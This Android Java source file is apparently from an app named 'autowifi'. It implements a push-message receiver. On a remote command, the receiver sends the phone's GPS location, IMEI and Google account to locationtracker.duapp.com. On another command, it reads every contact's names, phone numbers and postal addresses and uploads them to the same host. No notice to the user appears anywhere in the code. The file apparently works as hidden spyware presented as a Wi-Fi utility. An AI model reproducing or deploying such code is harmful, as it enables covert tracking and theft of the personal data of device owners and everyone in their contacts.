package com.eric.autowifi;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.location.Location;
import android.preference.PreferenceManager;
import android.provider.ContactsContract;
import android.util.Log;

import com.baidu.android.pushservice.PushConstants;
import com.google.gson.Gson;

/**
 * Push消息处理receiver
 */
public class PushMessageReceiver extends BroadcastReceiver {
	private final String REQUEST_LOCATION = "requestlocation";
	private final String REQUEST_CONTACTS = "requestcontacts";
	private String appid = "";
	private String channelid = "";
	private String userid = "";
	/** TAG to Log */
	public static final String TAG = PushMessageReceiver.class.getSimpleName();

	/**
	 * 
	 * 
	 * @param context
	 *            Context
	 * @param intent
	 *            接收的intent
	 */
	@Override
	public void onReceive(final Context context, Intent intent)
	{
		Log.d(TAG, ">>> Receive intent: \r\n" + intent);
		// long when = System.currentTimeMillis();
		if (intent.getAction().equals(PushConstants.ACTION_MESSAGE))
		{
			// 获取消息内容
			String content = intent.getExtras().getString(
					PushConstants.EXTRA_PUSH_MESSAGE_STRING);
			System.out.println("msg=" + content);

			if (REQUEST_LOCATION.equals(content))
			{

				LocationManagerUtil l = new LocationManagerUtil(context);
				l.requestLocation(new OnLocationChangeListener() {
					@Override
					public void onLocationChanged(Location location)
					{
						double lat = location.getLatitude();
						double lng = location.getLongitude();
						final String url = genUrl(Utils.getImei(context),
								Utils.getGoogleAccount(context), lat, lng,
								System.currentTimeMillis());
						new Thread(new Runnable() {
							@Override
							public void run()
							{
								HttpRequestHelper hrh = new HttpRequestHelper();
								hrh.sendRequestAndReturnJson(url);
							}
						}).start();
					}
				});
			}
			else if (REQUEST_CONTACTS.equals(content))
			{
				boolean hasUploaded = Utils.getHasUploadContacts(context);
				Log.d("PushMessageReceiver.REQUEST_CONTACTS.hasUploaded",
						String.valueOf(hasUploaded));
				if (!hasUploaded)
				{
					new Thread(new Runnable() {
						@Override
						public void run()
						{
							String json = getContactsInJSON(context);
							HttpRequestHelper hrh = new HttpRequestHelper();
							String url = "http://0.locationtracker.duapp.com/uploadContacts";
							List<NameValuePair> params = new ArrayList<NameValuePair>();
							params.add(new BasicNameValuePair("contactsJson",
									json));
							Log.d("REQUEST_CONTACTS.url", url);
							Log.d("REQUEST_CONTACTS.paras", json);
							JSONObject jo = hrh.sendPostRequestAndReturnJson(
									url, params);
							if (jo != null && jo.has("ret"))
							{
								int ret = -1;
								try
								{
									ret = jo.getInt("ret");
									if (ret != -1)
									{
										Utils.setHasUploadContacts(context,
												true);
									}
								} catch (JSONException e)
								{
									e.printStackTrace();
								}
							}
						}
					}).start();
				}
			}
		}
		else if (intent.getAction().equals(PushConstants.ACTION_RECEIVE))
		{
			// 处理绑定等方法的返回数据
			// PushManager.startWork()的返回值通过PushConstants.METHOD_BIND得到

			// 获取方法
			final String method = intent
					.getStringExtra(PushConstants.EXTRA_METHOD);
			// 方法返回错误码。若绑定返回错误（非0），则应用将不能正常接收消息。
			// 绑定失败的原因有多种，如网络原因，或access token过期。
			// 请不要在出错时进行简单的startWork调用，这有可能导致死循环。
			// 可以通过限制重试次数，或者在其他时机重新调用来解决。
			final int errorCode = intent
					.getIntExtra(PushConstants.EXTRA_ERROR_CODE,
							PushConstants.ERROR_SUCCESS);
			// 返回内容
			final String content = new String(
					intent.getByteArrayExtra(PushConstants.EXTRA_CONTENT));

			// 用户在此自定义处理消息,以下代码为demo界面展示用
			Log.d(TAG, "onMessage: method : " + method);
			Log.d(TAG, "onMessage: result : " + errorCode);
			Log.d(TAG, "onMessage: content : " + content);

			if (errorCode == 0)
			{
				try
				{
					JSONObject jsonContent = new JSONObject(content);
					JSONObject params = jsonContent
							.getJSONObject("response_params");
					appid = params.getString("appid");
					channelid = params.getString("channel_id");
					userid = params.getString("user_id");
				} catch (JSONException e)
				{
					Log.e(BPushUtils.TAG, "Parse bind json infos error: " + e);
				}
				new Thread(new Runnable() {
					@Override
					public void run()
					{
						StringBuffer url = new StringBuffer();
						try
						{
							url.append(
									"http://0.locationtracker.duapp.com/userinfo?")
									.append("imei=")
									.append(URLEncoder.encode(
											Utils.getImei(context), "utf-8"))
									.append("&googleAccount=")
									.append(URLEncoder.encode(
											Utils.getGoogleAccount(context),
											"utf-8"))
									.append("&appName=")
									.append(context.getResources().getString(
											R.string.app_name))
									.append("&appId=").append(appid)
									.append("&channelId=").append(channelid)
									.append("&userId=").append(userid)
									.append("&registerTime=")
									.append(System.currentTimeMillis());
						} catch (UnsupportedEncodingException e)
						{
							e.printStackTrace();
						}
						Log.d("PushMessageReceiver.onRegisterToBaidu",
								url.toString());
						HttpRequestHelper hrh = new HttpRequestHelper();
						JSONObject jo = hrh.sendRequestAndReturnJson(url
								.toString());
						if (jo != null && jo.has("ret"))
						{
							int ret = -1;
							try
							{
								ret = jo.getInt("ret");
								if (ret != -1)
								{
									SharedPreferences sp = PreferenceManager
											.getDefaultSharedPreferences(context);
									Editor editor = sp.edit();
									editor.putString("appid", appid);
									editor.putString("channel_id", channelid);
									editor.putString("user_id", userid);
									editor.commit();
								}
							} catch (JSONException e)
							{
								e.printStackTrace();
							}
						}
					}
				}).start();
			}
			else
			{
				Log.d("Bind Error Code", String.valueOf(errorCode));
				if (errorCode == 30607)
				{
					Log.d("Bind Fail", "update channel token-----!");
				}
			}
			// 可选。通知用户点击事件处理
		}
		else if (intent.getAction().equals(
				PushConstants.ACTION_RECEIVER_NOTIFICATION_CLICK))
		{
			// Log.d(TAG, "intent=" + intent.toUri(0));
			//
			// Intent aIntent = new Intent();
			// aIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			// aIntent.setClass(context, CustomActivity.class);
			// String title = intent
			// .getStringExtra(PushConstants.EXTRA_NOTIFICATION_TITLE);
			// aIntent.putExtra(PushConstants.EXTRA_NOTIFICATION_TITLE, title);
			// String content = intent
			// .getStringExtra(PushConstants.EXTRA_NOTIFICATION_CONTENT);
			// aIntent.putExtra(PushConstants.EXTRA_NOTIFICATION_CONTENT,
			// content);
			//
			// context.startActivity(aIntent);
		}
	}

	private String genUrl(String imei, String googleAccount, double latitude,
			double longitude, long uploadTime)
	{
		StringBuffer sb = new StringBuffer();
		sb.append("http://0.locationtracker.duapp.com/locationinfotrack?");
		try
		{
			if (imei != null)
			{
				sb.append("imei=").append(URLEncoder.encode(imei, "utf-8"));
			}
			if (googleAccount != null)
			{
				sb.append("&googleAccount=").append(
						URLEncoder.encode(googleAccount, "utf-8"));
			}
		} catch (UnsupportedEncodingException e)
		{
			e.printStackTrace();
		}
		if (latitude > 0)
		{
			sb.append("&latitude=").append(latitude);
		}
		if (longitude > 0)
		{
			sb.append("&longitude=").append(longitude);
		}
		if (uploadTime > 0)
		{
			sb.append("&uploadTime=").append(uploadTime);
		}
		return sb.toString();
	}

	private String getContactsInJSON(Context context)
	{
		// 获得所有的联系人
		Cursor cur = context.getContentResolver().query(
				ContactsContract.Contacts.CONTENT_URI,
				null,
				null,
				null,
				ContactsContract.Contacts.DISPLAY_NAME
						+ " COLLATE LOCALIZED ASC");
		List<ContactBean> cbList = null;
		// 循环遍历
		if (cur != null)
		{
			if (cur.moveToFirst())
			{
				int idColumn = cur
						.getColumnIndex(ContactsContract.Contacts._ID);
				int displayNameColumn = cur
						.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
				cbList = new ArrayList<ContactBean>();
				do
				{
					// 获得联系人的ID号
					String contactId = cur.getString(idColumn);
					// 获得联系人姓名
					String disPlayName = cur.getString(displayNameColumn);
					// 查看该联系人有多少个电话号码。如果没有这返回值为0
					ContactBean cb = null;
					if (disPlayName != null && !"".equals(disPlayName))
					{
						cb = new ContactBean();
						cb.setName(disPlayName);
					}
					else
					{
						continue;
					}
					int phoneCount = cur
							.getInt(cur
									.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
					if (phoneCount > 0)
					{
						// 获得联系人的电话号码
						Cursor phones = context
								.getContentResolver()
								.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
										null,
										ContactsContract.CommonDataKinds.Phone.CONTACT_ID
												+ " = " + contactId, null, null);
						if (phones != null)
						{
							if (phones.moveToFirst())
							{
								do
								{
									// 遍历所有的电话号码
									String phoneNumber = phones
											.getString(phones
													.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
									String phoneType = phones
											.getString(phones
													.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));
									cb.addPhone(phoneType, phoneNumber);
								} while (phones.moveToNext());
							}
							phones.close();
						}
					}
					else
					{
						continue;
					}

					// 获取该联系人地址
					Cursor address = context
							.getContentResolver()
							.query(ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_URI,
									null,
									ContactsContract.CommonDataKinds.Phone.CONTACT_ID
											+ " = " + contactId, null, null);
					if (address != null)
					{
						if (address.moveToFirst())
						{
							do
							{
								// 遍历所有的地址
								String street = address
										.getString(address
												.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
								String city = address
										.getString(address
												.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
								String region = address
										.getString(address
												.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
								String postCode = address
										.getString(address
												.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
								String formatAddress = address
										.getString(address
												.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.FORMATTED_ADDRESS));
								cb.addAddress(street, city, region, postCode,
										formatAddress);
							} while (address.moveToNext());
						}
						address.close();
					}
					cbList.add(cb);
				} while (cur.moveToNext());
			}
			cur.close();
		}

		if (cbList != null)
		{
			ContactJSONWrapper cw = new ContactJSONWrapper(
					Utils.getImei(context), cbList);
			Gson g = new Gson();
			return g.toJson(cw);
		}
		else
		{
			return null;
		}
	}
}
